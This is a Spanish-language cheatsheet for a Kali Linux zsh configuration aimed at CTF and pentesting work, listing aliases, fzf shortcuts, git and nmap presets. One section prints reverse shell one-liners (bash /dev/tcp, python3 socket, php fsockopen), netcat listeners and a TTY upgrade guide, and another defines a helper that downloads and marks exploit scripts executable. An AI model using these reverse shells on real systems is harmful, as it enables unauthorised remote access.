---
layout: ../../layouts/cheatlayout.astro
title: zsh
---


# 🎯 ZSH Cheatsheet - Configuracion y Atajos

> Descarga la .zshrc  configurado para Kali Linux   [https://github.com/VillaArreola/startctf](https://github.com/VillaArreola/startctf)

---


## 📋 Tabla de contenidos


---


## 🛠️ Herramientas Pro


### Zoxide - Saltar entre carpetas inteligentemente


```bash
z <nombre_carpeta>    # Salta a carpeta (recordar frecuencia)
z -                   # Vuelve a carpeta anterior
zi                    # Interactivo (FZF)
```


### Bat - Colorear archivos con sintaxis


```bash
bat archivo.py        # Ver archivo con colores
bat -l man archivo    # Aplicar formato de man
alias bat='batcat'    # Ya está configurado en tu zshrc
```


### FZF - Buscador borroso


```bash
Ctrl+T                # Buscar archivos en directorio actual
Ctrl+R                # Buscar en historial
Alt+C                 # Navegar directorios

# Completar con FZF en cualquier comando (usa **)
cd **<TAB>            # Buscar directorios para cd
ls **<TAB>            # Buscar archivos para listar
cat **<TAB>           # Buscar archivo para ver contenido
grep patrón **<TAB>   # Buscar archivos para grep
```


### LSD - ls mejorado


```bash
alias ls='lsd'        # ls con colores y iconos
ll                    # ls -l (detalles)
la                    # ls -A (ocultos)
l                     # ls -CF (compact)
```


---


## 📁 Aliases de Sistema


### Navegación rápida


```bash
..                    # cd ..
...                   # cd ../..
....                  # cd ../../..
.....                 # cd ../../../..
```


### Historial


```bash
alias history="history 0"    # Ver todo el historial
```


### Disk usage


```bash
du                    # du -h (tamaño carpetas)
df                    # df -h (espacios montar)
```


### Editor por defecto (configurable)


```bash
export EDITOR=nvim    # O vim/nano
export VISUAL=$EDITOR
```


---


## 🌐 Aliases de Red & Pentesting


### Información de IP


```bash
myip                  # Todas las IPs (local + VPN)
myip4                 # Solo IPv4 (sin loopback)
myip6                 # Solo IPv6
vpnip                 # IP del tun0 (VPN)
```


### Servidores web rápidos


```bash
www                   # Python HTTP.server en puerto 80
www8                  # Python HTTP.server en puerto 8000
phpserver             # PHP server en 0.0.0.0:8000
```


### Comando de red


```bash
ports                 # netstat -tulanp (puertos escuchando)
listening             # lsof -i -P (conexiones activas)
portscan              # nmap -sS -sV -O
```


### Grep avanzado


```bash
sgrep "pattern"       # grep -R -n -H -C 5 (recursivo con contexto)
```


### Copiar con progreso


```bash
cpv                   # rsync -ah --info=progress2 (Copia visible)
```


### Extraer archivos


```bash
extract archivo.tar.gz     # Extrae automáticamente (.tar.bz2, .zip, .rar, .7z, etc.)
```


---


## 🐙 Aliases Git


```bash
gs                    # git status
ga                    # git add
gc "mensaje"          # git commit -m "mensaje"
gp                    # git push
gl                    # git log --oneline --graph --decorate
```


---


## ⚡ Funciones Pro


### Crear directorio y entrar


```bash
mkcd nombre           # mkdir -p nombre && cd nombre
```


### Buscar procesos y matar


```bash
kp nombre_proceso     # Mata proceso por nombre (sudo kill -9)
```


### Buscar en historial


```bash
hs "búsqueda"         # history | grep "búsqueda"
```


### Copiar con progreso (rsync)


```bash
cp_p archivo1 archivo2   # Copia visual con barra de progreso
```


### Generar contraseña aleatoria


```bash
genpass               # 16 caracteres aleatorios (default)
genpass 32            # 32 caracteres aleatorios
```


### Ver puertos abiertos


```bash
listports             # sudo netstat -tulanp | grep LISTEN
```


### Buscar archivos por nombre


```bash
ff "nombre"           # find . -type f -iname "*nombre*"
fd "nombre"           # find . -type d -iname "*nombre*"
```


### Backup rápido


```bash
bk archivo.txt        # archivo.txt.bak.YYYYMMDD_HHMMSS
```


### Ver PATH legible


```bash
path                  # Muestra cada ruta en una línea
```


### Subir archivo a transfer.sh


```bash
transfer archivo      # Sube y devuelve URL pública temporal
```


### Extraer archivos automáticamente


```bash
extract archivo       # Detecta formato y extrae (.tar, .zip, .7z, .rar, .gz, etc.)
```


---


## 🎯 Nmap Presets


### Escaneos rápidos


```bash
nmap-quick <target>   # nmap -sC -sV -oN quick.txt <target>
nmap-full <target>    # nmap -p- -sC -sV -oN full.txt <target>
nmap-udp <target>     # sudo nmap -sU -sC -sV -oN udp.txt <target>
nmap-vuln <target>    # nmap --script vuln -oN vuln.txt <target>
```


### CTF Scan (Automático)


```bash
ctfscan 10.10.10.1    # nmap -sC -sV -oA nmap/10.10.10.1 10.10.10.1
                      # Crea carpeta nmap/ y guarda 3 formatos (.nmap, .gnmap, .xml)
```


---


## 🚀 Reverse Shells & Listeners


### Reverse Shell rápida


```bash
revshell              # Detecta IP de tun0 y puerto 443 (default)
revshell 192.168.1.1  # IP custom, puerto 443
revshell 192.168.1.1 4444   # IP y puerto custom

# Output: 3 opciones (bash, python3, php)
# bash -i >& /dev/tcp/IP/PORT 0>&1
# python3 -c 'import socket,subprocess,os;s=...'
# php -r '$sock=fsockopen("IP",PORT);...'
```


### Listener rápido


```bash
listen                # nc -lvnp 443 (default)
listen 4444           # nc -lvnp 4444
                      # Usa rlwrap para historial + edición
```


### Alias para nc


```bash
nc 192.168.1.1 4444   # netcat directo (con rlwrap)
alias nc='rlwrap nc'
```


### Upgrade TTY en shell reversa


```bash
ttyup                 # Muestra guía paso a paso
                      # 1. python3 -c 'import pty;pty.spawn("/bin/bash")'
                      # 2. Ctrl+Z
                      # 3. stty raw -echo; fg
                      # 4. export TERM=xterm
                      # 5. stty rows 38 columns 116
```


---


## 🔧 Utilidades


### Clipboard (requiere xclip o wl-clipboard)


```bash
echo "texto" | clip   # Copiar a clipboard
paste                 # Pegar desde clipboard
```


### Descargar exploits de GitHub


```bash
getexploit https://github.com/...script.py
                      # wget URL -O nombre && chmod +x nombre
```


### Actualizar sistema


```bash
update                # sudo apt update && full-upgrade -y && autoremove -y
```


---


## ⌨️ Atajos de Teclado


### Navegación


| Atajo       | Función                           |
| ----------- | --------------------------------- |
| `Ctrl+A`    | Inicio de línea                   |
| `Ctrl+E`    | Fin de línea                      |
| `Ctrl+<-`   | Palabra anterior                  |
| `Ctrl+->`   | Palabra siguiente                 |
| `Ctrl+U`    | Borrar línea (backward-kill-line) |
| `Ctrl+Supr` | Borrar palabra siguiente          |
| `Delete`    | Borrar carácter                   |


### Historial


| Atajo    | Función                               |
| -------- | ------------------------------------- |
| `↑`      | Comando anterior (busca en historial) |
| `↓`      | Comando siguiente                     |
| `Ctrl+R` | Búsqueda incremental en historial     |
| `Ctrl+S` | Búsqueda forward en historial         |


### Especiales


| Atajo        | Función                       |
| ------------ | ----------------------------- |
| `Shift+Tab`  | Deshacer última acción (undo) |
| `Ctrl+P`     | Toggle oneline/twoline prompt |
| `Ctrl+Space` | Aceptar autosuggestion        |


### FZF


| Atajo    | Función             |
| -------- | ------------------- |
| `Ctrl+T` | Buscar archivo      |
| `Ctrl+R` | Buscar historial    |
| `Alt+C`  | Navegar directorios |
| `Tab`    | Completar con FZF   |


---


## 📊 Configuración del Sistema


### Historial


```bash
HISTFILE=~/.zsh_history    # 50,000 líneas guardadas
HISTSIZE=50000
SAVEHIST=50000

# Opciones:
# - hist_expire_dups_first: Borra duplicados primero
# - hist_ignore_dups: No guarda comandos iguales consecutivos
# - hist_ignore_space: Ignora comandos que comienzan con espacio
# - extended_history: Guarda timestamp
```


### Variables de entorno


```bash
export MANPAGER="sh -c 'col -bx | bat -l man -p'"    # man con colores
export FZF_DEFAULT_OPTS="--height 40% --layout=reverse --border"
export TERM=xterm-256color
export EDITOR=nvim
```


### Completion


```bash
# zsh completion automático
# zstyle options para colors, matcher-list, etc.
```


---


## 💡 Tips & Tricks


### 1. Autosuggestions


El shell sugiere comandos del historial mientras escribes:


```bash
Ctrl+Space  # Acepta sugerencia
```


### 2. Syntax Highlighting


Se colorean en tiempo real:
- Comandos válidos: `cyan`
- Variables: `magenta`
- Paths: `bold`
- Errores: `underline`


### 3. Directory Stack


```bash
cd /path1      # pushd automático
cd /path2
popd           # Vuelve a /path1
```


### 4. Magic Equals


```bash
ls=lsd         # Expande a ls --color=auto
nmap=nmap -sC -sV    # Expande automáticamente
```


### 5. Vi-mode (opcional)


Actualmente usa `emacs key bindings`, pero puedes cambiar a `bindkey -v` si prefieres vi.


---


## 🔐 Seguridad & Best Practices


### ⚠️ NO ACTIVAR en Pentesting


```bash
setopt correct        # ❌ Puede auto-corregir comandos peligrosos
```


### ✅ ACTIVADO por defecto


```bash
setopt noclobber      # ✅ Previene sobrescribir archivos con >
setopt rm_star_wait   # ✅ Espera 10 segundos antes de rm *
setopt hist_ignore_space   # ✅ Ignora comandos con espacio prefix
```


---


## 🎨 Personalización del Prompt


Tu prompt actual está en formato **TWOLINE** (dos líneas):


```plain text
┌──(kali㉿kali)-[~/path/to/dir]
└─$
```


Alternar con:


```bash
Ctrl+P    # Toggle entre twoline y oneline
```


---


## 📝 Crear tus propios aliases/funciones


### Alias simple


```bash
echo "alias micomando='comando largo'" >> ~/.zshrc
source ~/.zshrc
```


### Función personalizada


```bash
myfunc() {
    echo "Mi función"
    # Tu lógica aquí
}
```


---


## 🚀 Rápido - Comandos más usados


```bash
# Networking
myip                  # Ver IPs
vpnip                 # Ver IP VPN
ports                 # Ver puertos abiertos

# Escaneo
ctfscan 10.10.10.1    # Escaneo rápido
nmap-full 10.10.10.1  # Escaneo completo

# Reverse shells
revshell              # Generar reverse shell
listen 443            # Listener

# Utilidades
extract archivo       # Extraer automático
mkcd proyecto         # Crear y entrar
genpass 32            # Contraseña aleatoria

# Git
gs                    # Status
gc "mensaje"          # Commit
gp                    # Push
```


---


## 📚 Referencias

- **Zshell**: https://www.zsh.org/
- **FZF**: https://github.com/junegunn/fzf
- **Bat**: https://github.com/sharkdp/bat
- **Zoxide**: https://github.com/ajeetdsouza/zoxide
- **LSD**: https://github.com/lsd-rs/lsd

---


**Última actualización**: 2025-12-27


**Compatibilidad**: Kali Linux, Debian-based systems

